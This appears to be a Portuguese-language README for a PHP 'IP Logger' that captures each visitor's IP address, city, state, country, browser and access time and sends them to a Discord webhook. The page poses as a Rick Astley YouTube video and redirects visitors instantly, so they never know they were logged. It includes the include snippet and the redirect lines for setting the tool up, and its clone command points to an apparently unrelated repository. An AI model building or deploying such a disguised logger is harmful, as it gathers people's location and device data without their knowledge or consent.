<div align="center">
  <h1>IP Looger</h1>
</div>

## Informações
Ip Logger simples em **PHP**, o IP Logger funciona usando um WebHook de discord, assim que o usuário acessar o link do IP Logger o WebHook envia uma mensagem contendo as informações do usuário que acessou o link/site (Lembrete, certifique-se se o seu serviço de hospedagem é compatível com sites que utilizam php)

## Recursos
- Endereço de ip
- Região (Cidade, Estado e Pais)
- Navegador
- Data e Horário em que o usuário acessou o link/site


## Editável (WebHook)
- Ícone
- Thumbnail

## Editável (php/html)

- index.php
- home.php
- index.css


# Instalação

```
$ git clone https://github.com/xnng/my-git-bash.git
```

voce também pode fazer a instalação pelas **Releases** do repositorio

Logo após extrair os arquivos você pode hospedar eles em seu site, caso o seu site já possua um arquivo **index.php** você pode estar excluindo o arquivo **index.php** do IP-Logger, porem você terá que adicionar o seguinte código abaixo ao seu arquivo **index.php**

```
<?php
include("Home.php");
$sendembed = New Discord();

$sendembed->Visitor();
?>
```

no arquivo **index.php** do projeto você será redirecionado instantaneamente para a musica **Rick Astley - Never Gonna Give You Up** no YouTube, caso você queira remover isso ou editar o link edite as seguintes linhas abaixo no arquivo **index.php**

- linha 10 (Titulo da index)
```
<title>Rick Astley - Never Gonna Give You Up (Official Music Video)</title>
```

- linha 14 (Link e tempo de redirecionamento)
```
<meta http-equiv= "refresh" content="0; URL='https://www.youtube.com/watch?v=dQw4w9WgXcQ'"/> <!-- Valor padrão 0 (segundos)-->
```
<div align="center">
  <h1>Preview</h1>

 ![Preview](https://files.catbox.moe/pk17cg.png)

(Foi utilizado o uso de VPN na preview acima)
</div>
